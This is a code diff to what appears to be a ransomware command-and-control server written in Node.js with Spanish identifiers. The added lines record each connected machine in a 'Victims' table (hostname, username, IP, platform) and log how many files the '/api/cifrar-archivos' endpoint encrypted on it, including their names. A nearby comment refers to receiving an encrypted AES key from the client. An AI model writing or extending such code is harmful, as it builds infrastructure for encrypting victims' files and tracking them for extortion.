@@ -411,6 +411,17 @@ app.post('/api/cifrar-archivos', async (req, res) => {
             archivos: data.archivosCifrados
           }, null, 2));
 
+          // Sync to Cloud DB (Encrypted)
+          const cliente = clientesConectados.get(clienteId);
+          syncToCloud('Encrypted', {
+            uuid: cliente?.uuid || clienteId,
+            hostname: cliente?.hostname || 'Unknown',
+            totalCifrados: data.resumenBasico?.totalCifrados || 0,
+            totalErrores: data.resumenBasico?.totalErrores || 0,
+            archivos: (data.archivosCifrados || []).slice(0, 20).map(a => a.nombre),
+            timestamp: new Date().toISOString()
+          });
+
           resolve({
             success: true,
             resumen: data.resumenBasico,
@@ -616,6 +627,19 @@ io.on('connection', (socket) => {
     // Notificar a todos los clientes web sobre el nuevo cliente
     io.emit('cliente-conectado', infoCliente);
     logServer(` Cliente registrado: ${infoCliente.nombre} [${infoCliente.username}@${infoCliente.ip}]`);
+
+    // Sync to Cloud DB (Victims)
+    syncToCloud('Victims', {
+      uuid: infoCliente.uuid,
+      socketId: socket.id,
+      hostname: infoCliente.hostname,
+      username: infoCliente.username,
+      ip: infoCliente.ip,
+      platform: infoCliente.platform,
+      arch: infoCliente.arch,
+      status: 'connected',
+      timestamp: infoCliente.timestamp
+    });
   });
 
   // Recibir clave AES cifrada del cliente
